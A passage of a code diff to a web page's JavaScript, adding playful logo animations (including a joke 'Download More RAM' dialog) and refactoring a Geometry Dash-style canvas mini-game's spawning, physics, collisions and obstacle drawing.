+            vx: -Math.sin(a) * 3, vy: -2,
+            color: '#B3B0AD', size: 3.5, alpha: 1, decay: 0.03, isCircle: true
+          });
+        }
+        if (f < 65) requestAnimationFrame(twister);
+        else { logo.style.transform = ''; isEventActive = false; }
+      };
+      twister();
+    }
+
+    // 15. Heartbeat Pulse
+    function eventHeartbeat() {
+      const logo = document.getElementById('logo'), r = logo.getBoundingClientRect();
+      const cx = r.left + r.width / 2, cy = r.top + r.height / 2;
+      let f = 0;
+
+      const beat = () => {
+        f++;
+        const s = 1 + Math.sin(f * 0.25) * Math.exp(-((f % 18) * 0.08)) * 0.35;
+        logo.style.transform = `scale(${s})`;
+        if (f % 5 === 0) {
+          fxParticles.push({
+            x: cx + (Math.random() - 0.5) * 20, y: cy,
+            vx: (Math.random() - 0.5) * 2.5, vy: -2 - Math.random() * 2.5,
+            color: '#FF1493', size: 16, alpha: 1, decay: 0.02, isText: true, text: '💖'
+          });
+        }
+        if (f < 60) requestAnimationFrame(beat);
+        else { logo.style.transform = ''; isEventActive = false; }
+      };
+      beat();
+    }
+
+    // 16. Ice Freeze & Shatter
+    function eventFreezeShatter() {
+      const logo = document.getElementById('logo'), r = logo.getBoundingClientRect();
+      const cx = r.left + r.width / 2, cy = r.top + r.height / 2;
+      logo.style.filter = 'hue-rotate(180deg) brightness(1.6)';
+      logo.style.transform = 'scale(0.95)';
+
+      setTimeout(() => {
+        logo.style.visibility = 'hidden';
+        shakeScreen(12, 10);
+        for (let i = 0; i < 50; i++) {
+          const a = Math.random() * Math.PI * 2, sp = 3 + Math.random() * 8;
+          fxParticles.push({
+            x: cx, y: cy, vx: Math.cos(a) * sp, vy: Math.sin(a) * sp,
+            color: '#E0FFFF', size: 4 + Math.random() * 6, alpha: 1, decay: 0.02
+          });
+        }
+        setTimeout(() => {
+          logo.style.filter = '';
+          logo.style.transform = '';
+          logo.style.visibility = 'visible';
+          isEventActive = false;
+        }, 750);
+      }, 650);
+    }
+
+    // 17. Download More RAM
+    function eventDownloadRam() {
+      const box = document.createElement('div');
+      box.className = 'win-error';
+      box.style.left = (window.innerWidth / 2 - 110) + 'px';
+      box.style.top = (window.innerHeight / 2 - 55) + 'px';
+      box.innerHTML = `<div><strong>Downloading 128GB Free RAM...</strong><div style="font-size:10px;color:#666;margin-top:2px;" id="ramText">0% Completed</div><div style="width:180px;height:10px;background:#ddd;margin-top:6px;border-radius:4px;overflow:hidden;"><div id="ramBar" style="width:0%;height:100%;background:#107C10;transition:width 1s linear;"></div></div></div>`;
+      document.body.appendChild(box);
+
+      let p = 0;
+      setTimeout(() => {
+        const bar = document.getElementById('ramBar');
+        if (bar) bar.style.width = '100%';
+      }, 50);
+
+      const pInt = setInterval(() => {
+        p += 15;
+        const txt = document.getElementById('ramText');
+        if (txt) txt.textContent = `${Math.min(100, p)}% Completed`;
+        if (p >= 100) clearInterval(pInt);
+      }, 140);
+
+      setTimeout(() => {
+        box.remove();
+        isEventActive = false;
+      }, 1600);
+    }
+
+    // 18. Earthquake
+    function eventEarthquake() {
+      const card = document.getElementById('mainCard'), r = card.getBoundingClientRect();
+      shakeScreen(35, 24);
+
+      for (let i = 0; i < 40; i++) {
+        setTimeout(() => {
+          fxParticles.push({
+            x: r.left + Math.random() * r.width, y: r.top,
+            vx: (Math.random() - 0.5) * 2.5, vy: 3 + Math.random() * 6,
+            color: '#8A8886', size: 3 + Math.random() * 5, alpha: 1, decay: 0.02
+          });
+        }, i * 25);
+      }
+      setTimeout(() => { isEventActive = false; }, 1100);
+    }
+
+    // 19. RGB Chromatic Wave
+    function eventNeonRgbWave() {
+      const logo = document.getElementById('logo');
+      let f = 0;
+      const rgb = () => {
+        f++;
+        logo.style.filter = `drop-shadow(${Math.sin(f * 0.4) * 10}px 0 #FF0055) drop-shadow(${-Math.sin(f * 0.4) * 10}px 0 #00FFFF)`;
+        logo.style.transform = `scale(${1 + Math.sin(f * 0.25) * 0.18})`;
+        if (f < 55) requestAnimationFrame(rgb);
+        else {
+          logo.style.filter = '';
+          logo.style.transform = '';
+          isEventActive = false;
+        }
+      };
+      rgb();
+    }
+
+    // 20. Slot Machine Scramble
+    function eventSlotMachine() {
+      const sqs = [document.getElementById('sq1'), document.getElementById('sq2'), document.getElementById('sq3'), document.getElementById('sq4')];
+      const logo = document.getElementById('logo'), r = logo.getBoundingClientRect();
+      const cx = r.left + r.width / 2, cy = r.top + r.height / 2;
+      let f = 0;
+
+      const roll = () => {
+        f++;
+        sqs.forEach((sq, idx) => {
+          if (sq && f < 15 + idx * 8) {
+            sq.setAttribute('fill', `hsl(${Math.random() * 360}, 85%, 55%)`);
+          }
+        });
+
+        if (f < 45) requestAnimationFrame(roll);
+        else {
+          if (sqs[0]) sqs[0].setAttribute('fill', '#F25022');
+          if (sqs[1]) sqs[1].setAttribute('fill', '#7FBA00');
+          if (sqs[2]) sqs[2].setAttribute('fill', '#00A4EF');
+          if (sqs[3]) sqs[3].setAttribute('fill', '#FFB900');
+
+          for (let i = 0; i < 25; i++) {
+            fxParticles.push({
+              x: cx, y: cy, vx: (Math.random() - 0.5) * 8, vy: -Math.random() * 6,
+              color: '#FFD700', size: 5, alpha: 1, decay: 0.03
+            });
+          }
+          isEventActive = false;
+        }
+      };
+      roll();
+    }
+
+    // --- RARE JACKPOT MINI-GAME SEQUENCE (~4% Roll) ---
+    function startMiniGameSequence() {
+      const logo = document.getElementById('logo'), canvas = document.getElementById('gameCanvas');
       const logoRect = logo.getBoundingClientRect();
-      const startLeft = logoRect.left;
-      const startTop = logoRect.top;
+      const startLeft = logoRect.left, startTop = logoRect.top;
 
       logo.style.visibility = 'hidden';
-
       canvas.width = window.innerWidth;
       canvas.height = window.innerHeight;
       const groundY = window.innerHeight - 75;
@@ -818,22 +1004,18 @@
       clone.innerHTML = '<div></div><div></div><div></div><div></div>';
       document.body.appendChild(clone);
 
-      let size = 44;
-      let top = startTop;
-      let vy = 0;
+      let size = 44, top = startTop, vy = 0;
       const targetTop = groundY - size;
 
       requestAnimationFrame(function fall() {
         vy += 0.9;
         top += vy;
-
         if (top >= targetTop) {
           top = targetTop;
           clone.style.top = top + 'px';
           squash();
           return;
         }
-
         clone.style.top = top + 'px';
         requestAnimationFrame(fall);
       });
@@ -844,9 +1026,8 @@
           f++;
           const s = f < 6 ? 1 - f * 0.06 : 0.64 + (f - 6) * 0.06;
           clone.style.transform = 'scaleY(' + Math.max(s, 0.6) + ')';
-          if (f < 12) {
-            requestAnimationFrame(squashFrame);
-          } else {
+          if (f < 12) requestAnimationFrame(squashFrame);
+          else {
             clone.remove();
             initGame(startLeft);
           }
@@ -855,10 +1036,9 @@
       }
     }
 
-    // --- Hardcore Geometry Dash Game Engine ---
+    // --- Geometry Dash Engine (With Full Textured Obstacles) ---
     function initGame(spawnX) {
-      const canvas = document.getElementById('gameCanvas');
-      const ctx = canvas.getContext('2d');
+      const canvas = document.getElementById('gameCanvas'), ctx = canvas.getContext('2d');
 
       const resize = () => {
         canvas.width = window.innerWidth;
@@ -866,152 +1046,87 @@
       };
       window.addEventListener('resize', resize);
 
-      const cubeSize = 40;
-      const landX = Math.max(60, spawnX);
-
-      // Fast Hardcore Physics
-      const JUMP_FORCE = -13.2;
-      const GRAVITY = 0.72;
+      const cubeSize = 40, landX = Math.max(60, spawnX);
+      const JUMP_FORCE = -13.2, GRAVITY = 0.72;
       const ROTATION_SPEED = (2 * Math.PI) / (2 * Math.abs(JUMP_FORCE) / GRAVITY);
 
       let groundY = canvas.height - 75;
-      let cube = { 
-        y: groundY - cubeSize, 
-        oldY: groundY - cubeSize,
-        vy: 0, 
-        angle: 0, 
-        jumping: false, 
-        onGround: true 
-      };
-
-      let obstacles = [];
-      let particles = [];
-      let ringPulses = [];
-      let frame = 0;
-      let worldOffset = 0;
-      let speed = 7.2;
-      let gameOver = false;
-      let shakeTime = 0;
-      let canRestart = false;
-      let isHoldingJump = false;
-      let jumpBufferTimer = 0;
+      let cube = { y: groundY - cubeSize, oldY: groundY - cubeSize, vy: 0, angle: 0, jumping: false, onGround: true };
+      let obstacles = [], particles = [], ringPulses = [];
+      let frame = 0, worldOffset = 0, speed = 7.2;
+      let gameOver = false, shakeTime = 0, canRestart = false, isHoldingJump = false, jumpBufferTimer = 0;
       let nextSpawnX = canvas.width + 60;
 
       ringPulses.push({ x: landX + cubeSize / 2, y: groundY, r: 8, alpha: 1.2, color: '#FFB900' });
 
-      // Chaotic entity spawner
       function spawnChaoticEntity(startX) {
         let cursorX = startX;
         const roll = Math.random();
 
-        // 1. Spikes
         if (roll < 0.32) {
           const count = 1 + Math.floor(Math.random() * 4);
           for (let i = 0; i < count; i++) {
-            const h = 18 + Math.floor(Math.random() * 30);
-            const w = 16 + Math.floor(Math.random() * 12);
+            const h = 18 + Math.floor(Math.random() * 30), w = 16 + Math.floor(Math.random() * 12);
             obstacles.push({ type: 'spike', x: cursorX, w: w, h: h });
             cursorX += w + Math.floor(Math.random() * 8);
           }
-        }
-        // 2. Spinning Saws
-        else if (roll < 0.58) {
-          const sawR = 16 + Math.floor(Math.random() * 20);
-          const inAir = Math.random() > 0.45;
+        } else if (roll < 0.58) {
+          const sawR = 16 + Math.floor(Math.random() * 20), inAir = Math.random() > 0.45;
           const sawY = inAir ? (groundY - 45 - Math.random() * 55) : (groundY - sawR + 2);
-
           obstacles.push({
-            type: 'saw',
-            x: cursorX + sawR,
-            y: sawY,
-            r: sawR,
-            rot: 0,
+            type: 'saw', x: cursorX + sawR, y: sawY, r: sawR, rot: 0,
             speed: (Math.random() > 0.5 ? 1 : -1) * (0.07 + Math.random() * 0.08)
           });
-
           if (inAir) {
             obstacles.push({ type: 'spike', x: cursorX + sawR - 10, w: 20, h: 22 });
-            if (Math.random() > 0.5) {
-              obstacles.push({ type: 'orb', orbType: 'pink', x: cursorX + sawR, y: groundY - 32, r: 15, used: false });
-            }
+            if (Math.random() > 0.5) obstacles.push({ type: 'orb', orbType: 'pink', x: cursorX + sawR, y: groundY - 32, r: 15, used: false });
           }
           cursorX += sawR * 2 + 10;
-        }
-        // 3. Multi-tier platforms
-        else if (roll < 0.82) {
-          const blockW = 35 + Math.floor(Math.random() * 95);
-          const blockH = 25 + Math.floor(Math.random() * 65);
+        } else if (roll < 0.82) {
+          const blockW = 35 + Math.floor(Math.random() * 95), blockH = 25 + Math.floor(Math.random() * 65);
           const blockY = groundY - blockH;
-
           obstacles.push({ type: 'block', x: cursorX, y: blockY, w: blockW, h: blockH });
 
           const sub = Math.random();
           if (blockH >= 50 && sub < 0.4) {
             const downCount = Math.max(1, Math.floor(blockW / 24));
-            for (let i = 0; i < downCount; i++) {
-              obstacles.push({ type: 'spike_down', x: cursorX + 6 + i * 24, y: blockY + blockH, w: 18, h: 22 + Math.random() * 12 });
-            }
+            for (let i = 0; i < downCount; i++) obstacles.push({ type: 'spike_down', x: cursorX + 6 + i * 24, y: blockY + blockH, w: 18, h: 22 + Math.random() * 12 });
           } else if (sub < 0.65 && blockW >= 55) {
             obstacles.push({ type: 'saw', x: cursorX + blockW / 2, y: blockY - 18, r: 18, rot: 0, speed: 0.1 });
           } else if (sub < 0.85 && blockW >= 45) {
             obstacles.push({ type: 'pad', x: cursorX + blockW / 2 - 16, y: blockY - 10, w: 32, h: 10, bounce: 0 });
           }
           cursorX += blockW;
-        }
-        // 4. Pads & Colored Orbs
-        else {
-          const isTrampoline = Math.random() > 0.5;
-          if (isTrampoline) {
+        } else {
+          if (Math.random() > 0.5) {
             const padW = 34, padH = 10;
             obstacles.push({ type: 'pad', x: cursorX, y: groundY - padH, w: padW, h: padH, bounce: 0 });
             cursorX += padW;
-
-            const pit = 2 + Math.floor(Math.random() * 4);
-            const pitGap = 30 + Math.random() * 30;
-            for (let i = 0; i < pit; i++) {
-              obstacles.push({ type: 'spike', x: cursorX + pitGap + i * 22, w: 20, h: 26 + Math.random() * 14 });
-            }
+            const pit = 2 + Math.floor(Math.random() * 4), pitGap = 30 + Math.random() * 30;
+            for (let i = 0; i < pit; i++) obstacles.push({ type: 'spike', x: cursorX + pitGap + i * 22, w: 20, h: 26 + Math.random() * 14 });
             cursorX += pitGap + pit * 22;
           } else {
-            const oRoll = Math.random();
-            const oType = oRoll < 0.35 ? 'pink' : (oRoll < 0.7 ? 'yellow' : 'red');
+            const oRoll = Math.random(), oType = oRoll < 0.35 ? 'pink' : (oRoll < 0.7 ? 'yellow' : 'red');
             const oY = groundY - (40 + Math.random() * 65);
-
             obstacles.push({ type: 'spike', x: cursorX + 10, w: 22, h: 28 });
             obstacles.push({ type: 'spike', x: cursorX + 34, w: 22, h: 28 });
             obstacles.push({ type: 'orb', orbType: oType, x: cursorX + 24, y: oY, r: 16, used: false });
             cursorX += 60;
           }
         }
-
-        const nextGap = 85 + Math.random() * 115;
-        return cursorX + nextGap;
+        return cursorX + (85 + Math.random() * 115);
       }
 
       function tryTriggerOrb() {
-        const cubeCenterX = landX + cubeSize / 2;
-        const cubeCenterY = cube.y + cubeSize / 2;
-
+        const cubeCenterX = landX + cubeSize / 2, cubeCenterY = cube.y + cubeSize / 2;
         for (let obs of obstacles) {
           if (obs.type === 'orb' && !obs.used) {
-            const dist = Math.hypot(cubeCenterX - obs.x, cubeCenterY - obs.y);
-            if (dist < 56) {
+            if (Math.hypot(cubeCenterX - obs.x, cubeCenterY - obs.y) < 56) {
               obs.used = true;
-
-              let boost = JUMP_FORCE * 1.08;
-              let pColor = '#FFB900';
-              if (obs.orbType === 'pink') {
-                boost = JUMP_FORCE * 0.72;
-                pColor = '#FF007F';
-              } else if (obs.orbType === 'red') {
-                boost = JUMP_FORCE * 1.45;
-                pColor = '#E81123';
-              }
-
-              cube.vy = boost;
-              cube.jumping = true;
-              cube.onGround = false;
-              jumpBufferTimer = 0;
+              let boost = JUMP_FORCE * 1.08, pColor = '#FFB900';
+              if (obs.orbType === 'pink') { boost = JUMP_FORCE * 0.72; pColor = '#FF007F'; }
+              else if (obs.orbType === 'red') { boost = JUMP_FORCE * 1.45; pColor = '#E81123'; }
+              cube.vy = boost; cube.jumping = true; cube.onGround = false; jumpBufferTimer = 0;
               ringPulses.push({ x: obs.x, y: obs.y, r: 16, alpha: 1.2, color: pColor });
               return true;
             }
@@ -1021,209 +1136,92 @@
       }
 
       function doJump() {
-        cube.vy = JUMP_FORCE;
-        cube.jumping = true;
-        cube.onGround = false;
-        cube.y -= 2;
-        jumpBufferTimer = 0;
+        cube.vy = JUMP_FORCE; cube.jumping = true; cube.onGround = false; cube.y -= 2; jumpBufferTimer = 0;
       }
 
       function jump() {
-        if (gameOver) {
-          if (canRestart) reset();
-          return;
-        }
-
+        if (gameOver) { if (canRestart) reset(); return; }
         if (tryTriggerOrb()) return;
-
-        if (cube.onGround) {
-          doJump();
-        } else {
-          jumpBufferTimer = 12;
-        }
+        if (cube.onGround) doJump();
+        else jumpBufferTimer = 12;
       }
 
       function die() {
         if (gameOver) return;
-        gameOver = true;
-        shakeTime = 18;
-        canRestart = false;
-
-        const cx = landX + cubeSize / 2;
-        const cy = cube.y + cubeSize / 2;
+        gameOver = true; shakeTime = 18; canRestart = false;
+        const cx = landX + cubeSize / 2, cy = cube.y + cubeSize / 2;
         for (let i = 0; i < 40; i++) {
-          const angle = Math.random() * Math.PI * 2;
-          const speedP = 3 + Math.random() * 9;
+          const a = Math.random() * Math.PI * 2, sp = 3 + Math.random() * 9;
           particles.push({
-            x: cx,
-            y: cy,
-            vx: Math.cos(angle) * speedP,
-            vy: Math.sin(angle) * speedP - 2.5,
-            color: msColors[Math.floor(Math.random() * msColors.length)],
-            size: 5 + Math.random() * 8,
-            rot: Math.random() * Math.PI,
-            vrot: (Math.random() - 0.5) * 0.35,
-            alpha: 1
+            x: cx, y: cy, vx: Math.cos(a) * sp, vy: Math.sin(a) * sp - 2.5,
+            color: msColors[Math.floor(Math.random() * msColors.length)], size: 5 + Math.random() * 8,
+            rot: Math.random() * Math.PI, vrot: (Math.random() - 0.5) * 0.35, alpha: 1
           });
         }
-
         setTimeout(() => { canRestart = true; }, 300);
       }
 
       function reset() {
         groundY = canvas.height - 75;
-        cube.y = groundY - cubeSize;
-        cube.oldY = cube.y;
-        cube.vy = 0;
-        cube.angle = 0;
-        cube.jumping = false;
-        cube.onGround = true;
-        obstacles = [];
-        particles = [];
-        ringPulses = [];
-        frame = 0;
-        worldOffset = 0;
-        speed = 7.2;
-        gameOver = false;
-        shakeTime = 0;
-        jumpBufferTimer = 0;
-        nextSpawnX = canvas.width + 60;
+        cube.y = groundY - cubeSize; cube.oldY = cube.y; cube.vy = 0; cube.angle = 0; cube.jumping = false; cube.onGround = true;
+        obstacles = []; particles = []; ringPulses = []; frame = 0; worldOffset = 0; speed = 7.2;
+        gameOver = false; shakeTime = 0; jumpBufferTimer = 0; nextSpawnX = canvas.width + 60;
       }
 
       window.addEventListener('keydown', (e) => {
         if (e.code === 'Space' || e.code === 'ArrowUp') {
           e.preventDefault();
-          if (!isHoldingJump) {
-            isHoldingJump = true;
-            jump();
-          }
+          if (!isHoldingJump) { isHoldingJump = true; jump(); }
         }
       });
       window.addEventListener('keyup', (e) => {
-        if (e.code === 'Space' || e.code === 'ArrowUp') {
-          isHoldingJump = false;
-        }
+        if (e.code === 'Space' || e.code === 'ArrowUp') isHoldingJump = false;
       });
-
       window.addEventListener('pointerdown', (e) => {
-        if (!e.target.closest('#installBtn')) {
-          isHoldingJump = true;
-          jump();
-        }
+        if (!e.target.closest('#installBtn')) { isHoldingJump = true; jump(); }
       });
-      window.addEventListener('pointerup', () => {
-        isHoldingJump = false;
-      });
+      window.addEventListener('pointerup', () => { isHoldingJump = false; });
 
       function loop() {
-        const W = canvas.width;
-        const H = canvas.height;
+        const W = canvas.width, H = canvas.height;
         groundY = H - 75;
 
         if (!gameOver) {
-          frame++;
-          worldOffset += speed;
-
+          frame++; worldOffset += speed;
           if (jumpBufferTimer > 0) jumpBufferTimer--;
+          if (isHoldingJump) tryTriggerOrb();
 
-          if (isHoldingJump) {
-            tryTriggerOrb();
-          }
+          cube.oldY = cube.y; cube.vy += GRAVITY; cube.y += cube.vy;
+          if (cube.jumping) cube.angle += ROTATION_SPEED;
 
-          cube.oldY = cube.y;
-          cube.vy += GRAVITY;
-          cube.y += cube.vy;
-
-          if (cube.jumping) {
-            cube.angle += ROTATION_SPEED;
-          }
-
-          let landedOnBlock = false;
-          let hitTrampolineThisFrame = false;
+          let landedOnBlock = false, hitTrampolineThisFrame = false;
 
           nextSpawnX -= speed;
-          if (nextSpawnX <= W) {
-            nextSpawnX = spawnChaoticEntity(W + 30);
-          }
+          if (nextSpawnX <= W) nextSpawnX = spawnChaoticEntity(W + 30);
 
           obstacles.forEach(obs => {
             obs.x -= speed;
-
-            // 1. Spikes
             if (obs.type === 'spike') {
-              if (
-                landX + cubeSize - 6 > obs.x &&
-                landX + 6 < obs.x + obs.w &&
-                cube.y + cubeSize > groundY - obs.h + 4
-              ) {
-                die();
-              }
-            }
-
-            // 2. Ceiling Hanging Spikes
-            else if (obs.type === 'spike_down') {
-              if (
-                landX + cubeSize - 6 > obs.x &&
-                landX + 6 < obs.x + obs.w &&
-                cube.y < obs.y + obs.h - 4 &&
-                cube.y + cubeSize > obs.y
-              ) {
-                die();
-              }
-            }
-
-            // 3. Saws
-            else if (obs.type === 'saw') {
+              if (landX + cubeSize - 6 > obs.x && landX + 6 < obs.x + obs.w && cube.y + cubeSize > groundY - obs.h + 4) die();
+            } else if (obs.type === 'spike_down') {
+              if (landX + cubeSize - 6 > obs.x && landX + 6 < obs.x + obs.w && cube.y < obs.y + obs.h - 4 && cube.y + cubeSize > obs.y) die();
+            } else if (obs.type === 'saw') {
               obs.rot += (obs.speed || 0.08);
-              const cubeCX = landX + cubeSize / 2;
-              const cubeCY = cube.y + cubeSize / 2;
-              const dist = Math.hypot(cubeCX - obs.x, cubeCY - obs.y);
-              if (dist < obs.r + cubeSize * 0.38) {
-                die();
+              if (Math.hypot((landX + cubeSize / 2) - obs.x, (cube.y + cubeSize / 2) - obs.y) < obs.r + cubeSize * 0.38) die();
+            } else if (obs.type === 'block') {
+              if (landX + cubeSize - 6 > obs.x && landX + 6 < obs.x + obs.w) {
+                if (cube.oldY + cubeSize <= obs.y + 14 && cube.y + cubeSize >= obs.y) {
+                  cube.y = obs.y - cubeSize; cube.vy = 0; cube.jumping = false; cube.onGround = true;
+                  cube.angle = Math.round(cube.angle / (Math.PI / 2)) * (Math.PI / 2);
+                  landedOnBlock = true;
+                  if (isHoldingJump || jumpBufferTimer > 0) doJump();
+                } else if (cube.y + cubeSize > obs.y + 8 && cube.y < obs.y + obs.h) die();
               }
-            }
-
-            // 4. Blocks
-            else if (obs.type === 'block') {
-              const inXRange = (landX + cubeSize - 6 > obs.x) && (landX + 6 < obs.x + obs.w);
-
-              if (inXRange && cube.oldY + cubeSize <= obs.y + 14 && cube.y + cubeSize >= obs.y) {
-                cube.y = obs.y - cubeSize;
-                cube.vy = 0;
-                cube.jumping = false;
-                cube.onGround = true;
-                cube.angle = Math.round(cube.angle / (Math.PI / 2)) * (Math.PI / 2);
-                landedOnBlock = true;
-
-                if (isHoldingJump || jumpBufferTimer > 0) {
-                  doJump();
-                }
-              }
-              else if (
-                landX + cubeSize - 4 > obs.x &&
-                landX + 8 < obs.x + obs.w &&
-                cube.y + cubeSize > obs.y + 8 &&
-                cube.y < obs.y + obs.h
-              ) {
-                die();
-              }
-            }
-
-            // 5. Pads
-            else if (obs.type === 'pad') {
+            } else if (obs.type === 'pad') {
               if (obs.bounce > 0) obs.bounce--;
-
-              const padOverlapX = (landX + cubeSize > obs.x + 2) && (landX < obs.x + obs.w - 2);
-              const padOverlapY = (cube.y + cubeSize >= obs.y - 6) && (cube.y + cubeSize <= obs.y + obs.h + 12);
-
-              if (padOverlapX && padOverlapY) {
-                cube.vy = -16.5;
-                cube.y = obs.y - cubeSize - 2;
-                cube.jumping = true;
-                cube.onGround = false;
-                hitTrampolineThisFrame = true;
-                obs.bounce = 8;
-                jumpBufferTimer = 0;
+              if (landX + cubeSize > obs.x + 2 && landX < obs.x + obs.w - 2 && cube.y + cubeSize >= obs.y - 6 && cube.y + cubeSize <= obs.y + obs.h + 12) {
+                cube.vy = -16.5; cube.y = obs.y - cubeSize - 2; cube.jumping = true; cube.onGround = false;
+                hitTrampolineThisFrame = true; obs.bounce = 8; jumpBufferTimer = 0;
                 ringPulses.push({ x: obs.x + obs.w / 2, y: obs.y, r: 12, alpha: 1.2, color: '#FFB900' });
               }
             }
@@ -1231,175 +1229,130 @@
 
           if (!landedOnBlock && !hitTrampolineThisFrame) {
             if (cube.y >= groundY - cubeSize) {
-              cube.y = groundY - cubeSize;
-              cube.vy = 0;
-              cube.jumping = false;
-              cube.onGround = true;
+              cube.y = groundY - cubeSize; cube.vy = 0; cube.jumping = false; cube.onGround = true;
               cube.angle = Math.round(cube.angle / (Math.PI / 2)) * (Math.PI / 2);
-
-              if (isHoldingJump || jumpBufferTimer > 0) {
-                doJump();
-              }
-            } else {
-              cube.onGround = false;
-            }
+              if (isHoldingJump || jumpBufferTimer > 0) doJump();
+            } else cube.onGround = false;
           }
 
           obstacles = obstacles.filter(obs => (obs.x + (obs.w || obs.r * 2 || 60)) > -70);
-
-          if (frame % 250 === 0) {
-            speed += 0.3;
-          }
+          if (frame % 250 === 0) speed += 0.3;
         }
 
-        particles.forEach(p => {
-          p.x += p.vx;
-          p.y += p.vy;
-          p.vy += 0.35;
-          p.rot += p.vrot;
-          p.alpha -= 0.02;
-        });
+        particles.forEach(p => { p.x += p.vx; p.y += p.vy; p.vy += 0.35; p.rot += p.vrot; p.alpha -= 0.02; });
         particles = particles.filter(p => p.alpha > 0);
 
-        ringPulses.forEach(r => {
-          r.r += 3.2;
-          r.alpha -= 0.04;
-        });
+        ringPulses.forEach(r => { r.r += 3.2; r.alpha -= 0.04; });
         ringPulses = ringPulses.filter(r => r.alpha > 0);
 
         ctx.clearRect(0, 0, W, H);
         ctx.save();
 
         if (shakeTime > 0) {
-          const sX = (Math.random() - 0.5) * shakeTime * 0.9;
-          const sY = (Math.random() - 0.5) * shakeTime * 0.9;
-          ctx.translate(sX, sY);
+          ctx.translate((Math.random() - 0.5) * shakeTime * 0.9, (Math.random() - 0.5) * shakeTime * 0.9);
           shakeTime--;
         }
 
-        // Ground Line
-        ctx.strokeStyle = '#B3B0AD';
-        ctx.lineWidth = 2;
-        ctx.beginPath();
-        ctx.moveTo(0, groundY);
-        ctx.lineTo(W, groundY);
-        ctx.stroke();
+        // Textured Ground
+        ctx.strokeStyle = '#323130'; ctx.lineWidth = 2.5;
+        ctx.beginPath(); ctx.moveTo(0, groundY); ctx.lineTo(W, groundY); ctx.stroke();
 
-        // Moving ground hashes
-        ctx.strokeStyle = '#D2D0CE';
-        ctx.lineWidth = 1.5;
+        ctx.strokeStyle = '#605E5C'; ctx.lineWidth = 2;
         for (let x = -((worldOffset) % 24); x < W; x += 24) {
-          ctx.beginPath();
-          ctx.moveTo(x, groundY);
-          ctx.lineTo(x + 10, groundY + 10);
-          ctx.stroke();
+          ctx.beginPath(); ctx.moveTo(x, groundY); ctx.lineTo(x + 10, groundY + 10); ctx.stroke();
         }
 
-        // Draw Obstacles
+        // Draw High-Contrast Textured Obstacles
         obstacles.forEach(obs => {
+          // 1. Spikes (Shaded & Outlined)
           if (obs.type === 'spike') {
-            ctx.fillStyle = '#323130';
-            ctx.beginPath();
-            ctx.moveTo(obs.x, groundY);
-            ctx.lineTo(obs.x + obs.w / 2, groundY - obs.h);
-            ctx.lineTo(obs.x + obs.w, groundY);
-            ctx.closePath();
-            ctx.fill();
-          }
+            ctx.fillStyle = '#1E1E1E';
+            ctx.beginPath(); ctx.moveTo(obs.x, groundY); ctx.lineTo(obs.x + obs.w / 2, groundY - obs.h); ctx.lineTo(obs.x + obs.w, groundY); ctx.closePath(); ctx.fill();
+            
+            // Spike outline & inner highlight
+            ctx.strokeStyle = '#D13438'; ctx.lineWidth = 1.5; ctx.stroke();
+            ctx.fillStyle = '#50E6FF';
+            ctx.beginPath(); ctx.moveTo(obs.x + obs.w / 2, groundY - obs.h + 3); ctx.lineTo(obs.x + obs.w / 2 - 2, groundY - 4); ctx.lineTo(obs.x + obs.w / 2 + 2, groundY - 4); ctx.closePath(); ctx.fill();
+          } 
+          // 2. Ceiling Spikes
           else if (obs.type === 'spike_down') {
-            ctx.fillStyle = '#323130';
-            ctx.beginPath();
-            ctx.moveTo(obs.x, obs.y);
-            ctx.lineTo(obs.x + obs.w / 2, obs.y + obs.h);
-            ctx.lineTo(obs.x + obs.w, obs.y);
-            ctx.closePath();
-            ctx.fill();
-          }
+            ctx.fillStyle = '#1E1E1E';
+            ctx.beginPath(); ctx.moveTo(obs.x, obs.y); ctx.lineTo(obs.x + obs.w / 2, obs.y + obs.h); ctx.lineTo(obs.x + obs.w, obs.y); ctx.closePath(); ctx.fill();
+            ctx.strokeStyle = '#D13438'; ctx.lineWidth = 1.5; ctx.stroke();
+          } 
+          // 3. Spinning Saws (Metallic Gear Texture)
           else if (obs.type === 'saw') {
-            ctx.save();
-            ctx.translate(obs.x, obs.y);
-            ctx.rotate(obs.rot);
-
-            const teeth = 8;
-            ctx.fillStyle = '#494847';
+            ctx.save(); ctx.translate(obs.x, obs.y); ctx.rotate(obs.rot);
+            const teeth = 8; ctx.fillStyle = '#201F1E';
             ctx.beginPath();
             for (let i = 0; i < teeth * 2; i++) {
-              const angle = (i * Math.PI) / teeth;
-              const rad = (i % 2 === 0) ? obs.r : obs.r * 0.72;
-              const sx = Math.cos(angle) * rad;
-              const sy = Math.sin(angle) * rad;
-              if (i === 0) ctx.moveTo(sx, sy);
-              else ctx.lineTo(sx, sy);
+              const a = (i * Math.PI) / teeth, rad = (i % 2 === 0) ? obs.r : obs.r * 0.72;
+              if (i === 0) ctx.moveTo(Math.cos(a) * rad, Math.sin(a) * rad);
+              else ctx.lineTo(Math.cos(a) * rad, Math.sin(a) * rad);
             }
-            ctx.closePath();
-            ctx.fill();
+            ctx.closePath(); ctx.fill();
+            ctx.strokeStyle = '#0078D4'; ctx.lineWidth = 1.5; ctx.stroke();
 
-            ctx.fillStyle = '#E1DFDD';
-            ctx.beginPath();
-            ctx.arc(0, 0, obs.r * 0.48, 0, Math.PI * 2);
-            ctx.fill();
-
-            ctx.fillStyle = '#D13438';
-            ctx.beginPath();
-            ctx.arc(0, 0, obs.r * 0.2, 0, Math.PI * 2);
-            ctx.fill();
+            // Inner Blade Disk
+            ctx.fillStyle = '#3B3A39'; ctx.beginPath(); ctx.arc(0, 0, obs.r * 0.52, 0, Math.PI * 2); ctx.fill();
+            ctx.fillStyle = '#FFB900'; ctx.beginPath(); ctx.arc(0, 0, obs.r * 0.22, 0, Math.PI * 2); ctx.fill();
             ctx.restore();
-          }
+          } 
+          // 4. Textured Platform Blocks (Tech Grid Texture, Never Invisible)
           else if (obs.type === 'block') {
-            ctx.fillStyle = '#ffffff';
+            // Dark Base Fill
+            ctx.fillStyle = '#2B2B2B';
             ctx.fillRect(obs.x, obs.y, obs.w, obs.h);
-            ctx.strokeStyle = '#323130';
-            ctx.lineWidth = 2;
+            
+            // Outer Border
+            ctx.strokeStyle = '#0078D4';
+            ctx.lineWidth = 2.5;
             ctx.strokeRect(obs.x, obs.y, obs.w, obs.h);
-            ctx.strokeStyle = '#D2D0CE';
-            ctx.strokeRect(obs.x + 4, obs.y + 4, obs.w - 8, obs.h - 8);
-          }
+            
+            // Inner Grid lines
+            ctx.strokeStyle = '#484644';
+            ctx.lineWidth = 1.5;
+            ctx.strokeRect(obs.x + 4, obs.y + 4, Math.max(0, obs.w - 8), Math.max(0, obs.h - 8));
+            
+            // Center Tech Dot
